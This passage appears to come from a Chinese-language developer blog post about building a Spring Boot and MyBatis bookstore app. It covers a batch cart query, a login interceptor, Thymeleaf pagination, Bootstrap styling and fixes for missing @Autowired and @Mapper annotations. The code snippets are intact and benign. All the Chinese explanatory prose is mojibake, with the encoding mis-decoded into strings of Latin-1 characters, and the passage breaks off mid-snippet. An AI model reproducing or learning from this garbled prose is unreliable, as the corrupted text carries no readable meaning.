class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Select(&#123;</span></span><br><span class="line"><span class="meta">        &quot;&lt;script&gt;&quot; +</span></span><br><span class="line"><span class="meta">                &quot;SELECT\n&quot; +</span></span><br><span class="line"><span class="meta">                &quot;\tbsc.*, bsb.NAME AS bookName, bsb.img_url AS img_url,\n&quot; +</span></span><br><span class="line"><span class="meta">                &quot;\tbsb.new_price AS new_price\n&quot; +</span></span><br><span class="line"><span class="meta">                &quot;FROM\n&quot; +</span></span><br><span class="line"><span class="meta">                &quot;\tbs_cart bsc\n&quot; +</span></span><br><span class="line"><span class="meta">                &quot;LEFT JOIN bs_book bsb ON bsc.book_id = bsb.id\n&quot; +</span></span><br><span class="line"><span class="meta">                &quot;WHERE bsc.id in\n&quot; +</span></span><br><span class="line"><span class="meta">                &quot;&lt;foreach item=&#x27;item&#x27; collection=&#x27;ids&#x27; open=&#x27;(&#x27; separator=&#x27;,&#x27; close=&#x27;)&gt;&quot; +</span></span><br><span class="line"><span class="meta">                &quot;#&#123;item&#125;&quot; +</span></span><br><span class="line"><span class="meta">                &quot;&lt;/foreach&gt;&quot; +</span></span><br><span class="line"><span class="meta">        &quot;&lt;/script&gt;&quot;</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line">List&lt;CartVo&gt; <span class="title function_">findCartListByIds</span><span class="params">(<span class="meta">@Param(&quot;ids&quot;)</span> List&lt;String&gt; ids)</span>;</span><br></pre></td></tr></table></figure><blockquote><p><code>@Param</code>  æ³¨è§£é€šå¸¸ç”¨äºæŒ‡å®šæ–¹æ³•å‚æ•°çš„åç§°ï¼Œä»¥ä¾¿åœ¨ MyBatis æ˜ å°„å™¨ XML æ–‡ä»¶ä¸­å¼•ç”¨è¯¥å‚æ•°ã€‚å½“æ–¹æ³•æœ‰å¤šä¸ªå‚æ•°æ—¶ï¼Œè¯¥æ³¨è§£å¯ä»¥å¸®åŠ© MyBatis åŒºåˆ†å®ƒä»¬ã€‚æ­¤å¤–ï¼Œä½¿ç”¨  <code>@Param</code>  æ³¨è§£å¯ä»¥ä½¿ä»£ç æ›´åŠ æ¸…æ™°æ˜“æ‡‚ã€‚</p></blockquote><p>è¿™æ˜¯ä¸€ä¸ª MyBatis çš„æ³¨è§£  <code>@Select</code> ï¼Œç”¨äºåœ¨æ•°æ®åº“ä¸­æŸ¥è¯¢æ•°æ®ã€‚åœ¨è¿™ä¸ªæ³¨è§£ä¸­ï¼Œä½¿ç”¨äº†ä¸€ä¸ª SQL è¯­å¥ï¼Œè¯¥è¯­å¥ä½¿ç”¨äº†  <code>LEFT JOIN</code>  æ“ä½œç¬¦å°†ä¸¤ä¸ªè¡¨  <code>bs_cart</code>  å’Œ  <code>bs_book</code>  è¿æ¥èµ·æ¥ã€‚æŸ¥è¯¢çš„ç»“æœåŒ…æ‹¬  <code>bs_cart</code>  è¡¨ä¸­çš„æ‰€æœ‰åˆ—ä»¥åŠ  <code>bs_book</code>  è¡¨ä¸­çš„  <code>name</code> ã€ <code>img_url</code>  å’Œ  <code>new_price</code>  åˆ—ã€‚    åœ¨ SQL è¯­å¥ä¸­ä½¿ç”¨äº†  <code>&lt;script&gt;</code>  æ ‡ç­¾ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ MyBatis ä¸­ï¼Œå¯ä»¥ä½¿ç”¨åŠ¨æ€ SQL è¯­å¥ï¼Œè¯¥æ ‡ç­¾ç”¨äºå°†å¤šä¸ª SQL è¯­å¥ç»„åˆåœ¨ä¸€èµ·ã€‚åœ¨  <code>&lt;script&gt;</code>  æ ‡ç­¾ä¸­ï¼Œä½¿ç”¨äº†  <code>foreach</code>  æ ‡ç­¾ï¼Œè¯¥æ ‡ç­¾ç”¨äºå¾ªç¯éå†ä¸€ä¸ªé›†åˆï¼Œå¹¶å°†é›†åˆä¸­çš„æ¯ä¸ªå…ƒç´ æ’å…¥åˆ° SQL è¯­å¥ä¸­ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ <code>foreach</code>  æ ‡ç­¾ç”¨äºå°†ä¼ å…¥çš„  <code>ids</code>  é›†åˆä¸­çš„å…ƒç´ æ’å…¥åˆ° SQL è¯­å¥ä¸­çš„  <code>WHERE</code>  å­å¥ä¸­ã€‚   æœ€åï¼Œä½¿ç”¨äº†  <code>#&#123;item&#125;</code>  è¡¨ç¤ºæ¯ä¸ªå…ƒç´ çš„å€¼ï¼Œè¿™ä¸ªå€¼ä¼šè¢« MyBatis è‡ªåŠ¨è½¬ä¹‰ï¼Œä»¥é¿å… SQL æ³¨å…¥æ”»å‡»ã€‚</p><p>å³mybatisæä¾›çš„å¯¹åˆ—è¡¨çš„æ‰¹é‡æŸ¥è¯¢</p><h2 id="ä¼˜åŒ–"><a href="#ä¼˜åŒ–" class="headerlink" title="ä¼˜åŒ–"></a>ä¼˜åŒ–</h2><h3 id="æœªç™»å½•æƒ…å†µçš„æ‹¦æˆªå™¨è¯†åˆ«"><a href="#æœªç™»å½•æƒ…å†µçš„æ‹¦æˆªå™¨è¯†åˆ«" class="headerlink" title="æœªç™»å½•æƒ…å†µçš„æ‹¦æˆªå™¨è¯†åˆ«"></a>æœªç™»å½•æƒ…å†µçš„æ‹¦æˆªå™¨è¯†åˆ«</h3><p>springbootå¯ä»¥ç›´æ¥åœ¨interceptorä¸‹è¿›è¡Œè‡ªå®šä¹‰æ‹¦æˆªå™¨ï¼šå®ç°HandlerInterceptoræ¥å£ï¼Œå¹¶é‡å†™preHandle()å’ŒpostHandleæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PermissionInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) session.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(user != <span class="literal">null</span> &amp;&amp; user.getUsername() != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            response.sendRedirect(request.getContextPath() + <span class="string">&quot;/book/index&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†å…¶æ³¨å…¥åˆ°WebMvcConfigä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span>&#123;</span><br><span class="line">    registry.addInterceptor(<span class="keyword">new</span> <span class="title class_">PermissionInterceptor</span>()).addPathPatterns(<span class="string">&quot;/order/**&quot;</span>,<span class="string">&quot;/cart/**&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç¾åŒ–éƒ¨åˆ†"><a href="#ç¾åŒ–éƒ¨åˆ†" class="headerlink" title="ç¾åŒ–éƒ¨åˆ†"></a>ç¾åŒ–éƒ¨åˆ†</h2><ul><li>ç¿»é¡µéƒ¨åˆ†ï¼š</li></ul><p>bootstrapåœ¨liæ ‡ç­¾ä¸Šå¯ä»¥ä½¿ç”¨classappend&#x3D;â€™disabledâ€™ä½¿æŒ‰é’®æ¶ˆå¤±ï¼Œæ¯”å¦‚å·²ç»ç¿»åˆ°ç¬¬ä¸€é¡µï¼Œå°±åº”è¯¥æ²¡æœ‰ä¸Šä¸€é¡µçš„æŒ‰é’®ï¼Œæ›´äººæ€§åŒ–</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">th:classappend</span>=<span class="string">&quot;$&#123;cur == 1&#125; ? &#x27;disabled&#x27; : &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">th:style</span>=<span class="string">&quot;$&#123;cur == 1&#125; ? &#x27;pointer-events:none&#x27; : &#x27;&#x27;&quot;</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">th:onclick</span>=<span class="string">&quot;|loadData($&#123;pre&#125;,$&#123;category&#125;)|&quot;</span>&gt;</span><span class="symbol">&amp;larr;</span>ä¸Šä¸€é¡µ<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸‹ä¸€é¡µç±»ä¼¼</p><p>å›¾ä¹¦ä¸ä¸Šä¸‹é¡µæŒ‰é’®å±…ä¸­ï¼Œç”¨divæ ‡ç­¾çš„<code>class=&quot;container&quot;</code>å³å¯æ§åˆ¶</p><p>ï¼ˆå‰ç«¯çš„è°ƒè¯•åœ¨F12é€‰ä¸­æ”¹è¦å¿«å¾ˆå¤šï¼‰</p><ul><li>åˆ†é¡µçš„ç¿»é¡µæŒ‰é’®ï¼š</li></ul><p>è¿™é‡Œå¯¹å‰ç«¯çš„ç¿»é¡µä»£ç åšä¸‹è§£é‡Šï¼Œåœ¨bookListDataä¸­ï¼š</p><p>å¦‚æœé¡µæ•°çš„å›¾æ ‡ç­‰äºå½“å‰é¡µï¼Œåˆ™é«˜äº®ï¼Œé¡ºä¾¿eachéå†ä¹ŸæŒ‰é¡µæ•°æŠŠå›¾æ ‡åšäº†</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">th:each</span>=<span class="string">&quot;i:$&#123;#numbers.sequence(1,pages)&#125;&quot;</span> <span class="attr">th:class</span>=<span class="string">&quot;$&#123;cur == i&#125; ? &#x27;active&#x27; : &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;i&#125;&quot;</span> <span class="attr">th:onclick</span>=<span class="string">&quot;loadData([[$&#123;i&#125;]],[[$&#123;pageSize&#125;]],[[$&#123;category&#125;]])&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¾¾åˆ°è¿™ä¸ªæ•ˆæœï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230521215052494.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230521215052494.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>æ³¨å†Œç”¨æˆ·åæ˜¯å¦å­˜åœ¨éƒ¨åˆ†ï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">success</span>:<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">            $(<span class="string">&quot;#msg&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;display&quot;</span>,<span class="string">&quot;block&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (data == <span class="number">102</span>) &#123;<span class="comment">//ç”¨æˆ·å­˜åœ¨</span></span><br><span class="line">                $(<span class="string">&quot;#tip&quot;</span>).<span class="title function_">html</span>(<span class="string">&quot;ç”¨æˆ·åä¸åˆæ³•&quot;</span>);</span><br><span class="line">                $(<span class="string">&quot;#tip&quot;</span>).<span class="title function_">removeClass</span>(<span class="string">&quot;alert-success&quot;</span>);</span><br><span class="line">                $(<span class="string">&quot;#tip&quot;</span>).<span class="title function_">addClass</span>(<span class="string">&quot;alert-danger&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $(<span class="string">&quot;#tip&quot;</span>).<span class="title function_">html</span>(<span class="string">&quot;ç”¨æˆ·åå¯ä»¥æ³¨å†Œ&quot;</span>);</span><br><span class="line">                $(<span class="string">&quot;#tip&quot;</span>).<span class="title function_">removeClass</span>(<span class="string">&quot;alert-danger&quot;</span>);</span><br><span class="line">                $(<span class="string">&quot;#tip&quot;</span>).<span class="title function_">addClass</span>(<span class="string">&quot;alert-success&quot;</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>åœ¨å‡½æ•°ä¸­ï¼š</p><ol><li><p><code>$(&quot;#msg&quot;).css(&quot;display&quot;,&quot;block&quot;);</code> è®¾ç½® id ä¸º â€œmsgâ€ çš„å…ƒç´ çš„ display æ ·å¼ä¸º â€œblockâ€ï¼Œç”¨äºæ˜¾ç¤ºä¸€ä¸ªæç¤ºæ¶ˆæ¯ã€‚</p></li><li><p><code>if (data == 102) &#123;</code> åˆ¤æ–­è¿”å›çš„æ•°æ®æ˜¯å¦ç­‰äº 102ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¡¨ç¤ºç”¨æˆ·å·²å­˜åœ¨ï¼Œæ­¤æ—¶é¡µé¢ä¸Šä¼šæ˜¾ç¤º â€œç”¨æˆ·åä¸åˆæ³•â€ çš„æç¤ºä¿¡æ¯ï¼Œå¹¶å°†æç¤ºæ¡†çš„æ ·å¼ä» alert-success æ”¹ä¸º alert-dangerã€‚</p></li><li><p><code>$(&quot;#tip&quot;).html(&quot;ç”¨æˆ·åå¯ä»¥æ³¨å†Œ&quot;);</code> å¦‚æœè¿”å›æ•°æ®ä¸ç­‰äº 102ï¼Œåˆ™è¡¨ç¤ºç”¨æˆ·åå¯ä»¥æ³¨å†Œï¼Œæ­¤æ—¶å°†æç¤ºä¿¡æ¯æ”¹ä¸º â€œç”¨æˆ·åå¯ä»¥æ³¨å†Œâ€ï¼Œå¹¶å°†æç¤ºæ¡†çš„æ ·å¼ä» alert-danger æ”¹ä¸º alert-successã€‚</p></li></ol><p>å…¶ä¸­ï¼Œ#msg å’Œ #tip éƒ½æ˜¯ç½‘é¡µä¸­çš„å…ƒç´ ï¼Œåˆ†åˆ«ç”¨äºæ˜¾ç¤ºæ¶ˆæ¯å’Œæç¤ºæ¡†ã€‚</p><p>è¿™æ ·å°±å¯ä»¥å®ç°â€ç”¨æˆ·åå¯ä»¥ä½¿ç”¨â€œæ˜¯ç»¿æ ‡ç­¾ï¼Œâ€ç”¨æˆ·åå·²ä½¿ç”¨â€œæ˜¯çº¢æ ‡ç­¾</p><ul><li>è½®æ’­éƒ¨åˆ†</li></ul><p>è½®æ’­ç›´æ¥ç”¨çš„bootstrapå®ç°</p><p><code>class=&quot;carousel-control left&quot;</code>ï¼šè¿™ä¸ªå…ƒç´ å…·æœ‰ä¸¤ä¸ªç±»åï¼Œåˆ†åˆ«æ˜¯ <code>carousel-control</code> å’Œ <code>left</code>ã€‚ <code>carousel-control</code> æ˜¯ä¸€ä¸ª Bootstrap çš„ç±»åï¼Œå®ƒå‘Šè¯‰æµè§ˆå™¨å°†è¿™ä¸ªå…ƒç´ ä½œä¸ºè½®æ’­ç»„ä»¶çš„æ§ä»¶æ¥å‘ˆç°ã€‚ <code>left</code> ç±»åæŒ‡ç¤ºè¯¥å…ƒç´ å°†å®šä½åˆ°è½®æ’­ç»„ä»¶çš„å·¦ä¾§ã€‚<br>- <code>href=&quot;#myCarousel&quot;</code>ï¼š<code>href</code> å±æ€§æŒ‡å®šäº†é“¾æ¥ï¼Œå½“ç”¨æˆ·å•å‡»è¿™ä¸ªå…ƒç´ æ—¶ï¼Œä¼šè‡ªåŠ¨è·³è½¬åˆ°æŒ‡å®šçš„é“¾æ¥ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé“¾æ¥æ˜¯ä¸€ä¸ª ID ä¸º <code>myCarousel</code> çš„å…ƒç´ ï¼Œå®ƒæ˜¯è½®æ’­ç»„ä»¶çš„ä¸»è¦å®¹å™¨ã€‚<br>- <code>data-slide=&quot;prev&quot;</code>ï¼šè¿™ä¸ªå±æ€§å‘Šè¯‰è½®æ’­ç»„ä»¶å½“ç”¨æˆ·å•å‡»è¯¥å…ƒç´ æ—¶å‘å‰æ»‘åŠ¨ä¸€å¼ å¹»ç¯ç‰‡ã€‚ <code>data-slide</code> æ˜¯ä¸€ä¸ª Bootstrap å±æ€§</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;carousel-control left&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#myCarousel&quot;</span> <span class="attr">data-slide</span>=<span class="string">&quot;prev&quot;</span>&gt;</span><span class="symbol">&amp;lsaquo;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é¡µåº•ä¹Ÿæ˜¯bootstrapå†™çš„</p><ul><li>æ³¨å†Œéƒ¨åˆ†ï¼š</li></ul><p><code>$(&quot;#register&quot;).modal(&#39;hide&#39;);</code>æ³¨å†ŒæˆåŠŸåæŠŠæ³¨å†Œçš„æ¨¡æ€æ¡†éšè—</p><ul><li>ä»·æ ¼éƒ¨åˆ†ï¼š</li></ul><p>åŸä»·ç”¨<code>style=&quot;text-decoration: line-through;&quot;</code>åšåˆ’çº¿å¤„ç†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522172953079.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230522172953079.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>* </p><h1 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h1><p>åˆšå¼€å§‹æˆ‘çš„bookserviceå¿˜æ·»åŠ @Autowiredæ³¨è§£äº†ï¼Œåˆ°å¤„å‡ºç°å¦‚ä¸‹æŠ¥é”™ï¼š</p><p><code>Servlet.service() for servlet [dispatcherServlet] in context with path [/book] threw exception</code></p><blockquote><p>@Autowiredå¯ä»¥æ ‡æ³¨åœ¨å±æ€§ä¸Šã€æ–¹æ³•ä¸Šå’Œæ„é€ å™¨ä¸Šï¼Œæ¥å®Œæˆè‡ªåŠ¨è£…é…ã€‚é»˜è®¤æ˜¯æ ¹æ®å±æ€§ç±»å‹ï¼Œspringè‡ªåŠ¨å°†åŒ¹é…åˆ°çš„å±æ€§å€¼è¿›è¡Œæ³¨å…¥ï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªå±æ€§ï¼ˆå¯¹Springboot02WebApplicationTestsç±»æ¥è¯´ï¼‰autoWiredBeanå¯¹è±¡çš„æ–¹æ³•ã€‚<br>æ€ä¹ˆç”¨ï¼Ÿ<br>å®ƒå¯ä»¥æ ‡æ³¨åœ¨å±æ€§ä¸Šã€æ–¹æ³•ä¸Šå’Œæ„é€ å™¨ä¸Šï¼Œé‚£æœ‰ä»€ä¹ˆåŒºåˆ«å—ï¼Ÿç®€å•æ¥è¯´å› ä¸ºç±»æˆå‘˜çš„åˆå§‹åŒ–é¡ºåºä¸åŒï¼Œé™æ€æˆå‘˜ â€”â€”&gt; å˜é‡åˆå§‹åŒ–ä¸ºé»˜è®¤å€¼â€”â€”&gt;æ„é€ å™¨â€”â€”&gt;ä¸ºå˜é‡èµ‹å€¼ã€‚å¦‚æœæ ‡æ³¨åœ¨å±æ€§ä¸Šï¼Œåˆ™åœ¨æ„é€ å™¨ä¸­å°±ä¸èƒ½ä½¿ç”¨è¿™ä¸ªå±æ€§ï¼ˆå¯¹è±¡ï¼‰çš„å±æ€§å’Œæ–¹æ³•ã€‚<br><strong>å½“æ ‡æ³¨çš„å±æ€§æ˜¯æ¥å£æ—¶ï¼Œå…¶å®æ³¨å…¥çš„æ˜¯è¿™ä¸ªæ¥å£çš„å®ç°ç±»</strong>ï¼Œ å¦‚æœè¿™ä¸ªæ¥å£æœ‰å¤šä¸ªå®ç°ç±»ï¼Œåªä½¿ç”¨@Autowiredå°±ä¼šæŠ¥é”™</p></blockquote><p>æ ¹æ®å¦‚ä¸‹æ–‡æ¡£ï¼Œå¯çŸ¥serviceçš„å®ä¾‹å˜é‡ï¼Œä¹Ÿå°±æ˜¯éœ€è¦ä½¿ç”¨åˆ°beançš„åœºæ™¯éœ€è¦autowired</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> BookService bookService;</span><br></pre></td></tr></table></figure><blockquote><p><code>@Autowired</code> æ³¨è§£ç”¨äºè¿›è¡Œè‡ªåŠ¨è£…é…ä¾èµ–å…³ç³»ï¼Œé€šå¸¸åº”è¯¥åœ¨éœ€è¦ä½¿ç”¨æŸä¸ªBeançš„æ—¶å€™ä½¿ç”¨è¯¥æ³¨è§£ã€‚ä¾‹å¦‚ï¼Œåœ¨Serviceç±»ä¸­éœ€è¦ç”¨åˆ°æŸä¸ªDAOç±»çš„å®ä¾‹æ—¶ï¼Œå¯ä»¥åœ¨Serviceç±»çš„å®ä¾‹å˜é‡ä¸Šä½¿ç”¨ <code>@Autowired</code> æ³¨è§£ï¼ŒSpringæ¡†æ¶ä¼šè‡ªåŠ¨æŸ¥æ‰¾å¹¶æ³¨å…¥è¯¥å®ä¾‹çš„ä¾èµ–å…³ç³»ã€‚æ­¤å¤–ï¼Œ <code>@Autowired</code> æ³¨è§£é€šå¸¸åº”è¯¥ä¸å…¶ä»–æ³¨è§£ï¼ˆä¾‹å¦‚ <code>@Service</code> ã€ <code>@Component</code> ç­‰ï¼‰ä¸€èµ·ä½¿ç”¨ï¼Œä»¥ä½¿Springèƒ½å¤Ÿè‡ªåŠ¨æ‰«æå’Œè£…é…åº”ç”¨ç¨‹åºä¸­çš„Beanã€‚</p></blockquote><blockquote><p>æ²¡æœ‰@Autowiredï¼Œä¸ä¼šè‡ªåŠ¨æ³¨å…¥ï¼Œå£°æ˜è‡ªå®šä¹‰çš„serviceæˆ–mapperç„¶åä½¿ç”¨æ—¶ä¸€å®šè¦è‡ªåŠ¨æ³¨å…¥ï¼</p></blockquote><ul><li>ç¬¬äºŒä¸ªé—®é¢˜ï¼šæˆ‘çš„BookMapperæ²¡æœ‰åŠ @Mapperæ³¨è§£æ²¡æœ‰æŠ¥é”™ï¼Œä½†æ˜¯UserMapperæ²¡æœ‰åŠ @Mapperæ³¨è§£æ—¶ï¼Œç”¨@Autowiredè¿›è¡ŒuserMapperå£°æ˜æ—¶ä¼šæŠ¥é”™</li></ul><p>é—®é¢˜å°±å‡ºåœ¨Bookçš„å®ç°æ˜¯åœ¨Controllerå¯¹bookServiceè¿›è¡Œä½¿ç”¨ï¼Œå¹¶æ²¡æœ‰ç”¨åˆ°å£°æ˜Mapperï¼Œä¹Ÿå°±ä¸éœ€è¦Mapperçš„beanã€‚ä½†æ˜¯UseråŠŸèƒ½çš„å®ç°æˆ‘æ˜¯å†™åœ¨UserServiceé‡Œçš„ï¼Œéœ€è¦ç›´æ¥ç”¨åˆ°userMapper</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514205615147.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514205615147.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å°±æ­¤çœ‹æ¥æ˜¯å¦æ³¨å…¥çš„è§„åˆ™å¾ˆç®€å•ï¼Œä¸€èˆ¬æ¥è¯´è¿™äº›éƒ½åº”è¯¥æ³¨å…¥ï¼Œåˆæˆ–æ˜¯è¦autowiredè‡ªåŠ¨è£…é…ä¸€ä¸ªæ¥å£ï¼Œå°±éœ€è¦åœ¨ä¸Šä¸€æ­¥å¯¹å…¶æ³¨è§£</p><ul><li>ç¬¬ä¸‰ä¸ªé—®é¢˜ï¼šç”±äºæˆ‘çš„å‰ç«¯æ˜¯ç›´æ¥ç”¨çš„bootstrapåšçš„è½®æ’­å›¾ï¼Œåœ¨æƒ³è°ƒæ•´è½®æ’­å›¾å¤§å°çš„æ—¶å€™ï¼Œç›´æ¥å¯¹bootstrap.cssä¿®æ”¹ä¸èµ·ä½œç”¨ï¼Œåœ¨F12çš„å¼€å‘è€…boxé‡Œçœ‹åˆ°ï¼Œä»£ç ä¾æ—§æ˜¯bootstrap.min.cssçš„ä»£ç </li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230518093604125.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230518093604125.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™é‡Œæˆ‘çš„å¤„ç†æ–¹å¼æ˜¯åœ¨boxé‡ŒæŠŠæ•°æ®æ”¹äº†ï¼Œç„¶åä¿å­˜åˆ°æœ¬åœ°æŠŠåŸbootstrap.min.cssè¦†ç›–ï¼Œè™½ç„¶æ¯”è¾ƒéº»çƒ¦ï¼Œä½†æ˜¯æœ‰æ•ˆæœ</p><p>ä½†æ˜¯åœ¨imgé‡Œè®¾ç½®ç”¨<code>object-fit:cover</code>å§‹ç»ˆä¸èƒ½å¡«æ»¡boxï¼Œåæ¥ç»ˆäºåœ¨æŸ¥çœ‹å™¨é‡Œå‘ç°index.cssé‡Œå¯¹å›¾ç‰‡åˆé‡æ–°åšäº†å®šä¹‰gcarouse imgï¼ŒæŠŠå…¶å¯¹åº”çš„é•¿å®½ï¼Œå–æ¶ˆæ‰“å‹¾ï¼Œå¯¹åº”åœ¨è½®æ’­çš„å›¾ç‰‡é•¿å®½å°±èµ·ä½œç”¨äº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230518103241451.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230518103241451.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™ä¸ªé”™è¯¯å¯¹æˆ‘æ¥è¯´å½±å“æ·±è¿œï¼Œå› ä¸ºå­¦åˆ°äº†æ‰€è§å³æ‰€å¾—çš„æŸ¥çœ‹å™¨è°ƒè¯•cssæ ·å¼</p><ul><li>åœ¨æ§åˆ¶ç¿»åˆ°ç¬¬ä¸€é¡µå’Œæœ€åä¸€é¡µæ—¶ï¼Œä¸èƒ½ä»…ä»…å¯¹æ ·å¼è®¾class:disabledåªèƒ½ç¦æ‰æ ·å¼ï¼Œè¿˜è¦ä»¤styleçš„<code>pointer-events:none</code>ï¼Œä¸ç„¶åªæ˜¯æ ·å¼å˜äº†ï¼Œè¿˜èƒ½å®ç°ç¿»é¡µåŠŸèƒ½ï¼Œå°±ç¿»åˆ°äº†ç©ºé¡µ</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">th</span>:style=<span class="string">&quot;$&#123;cur == 1&#125; ? &#x27;pointer-events:none&#x27; : 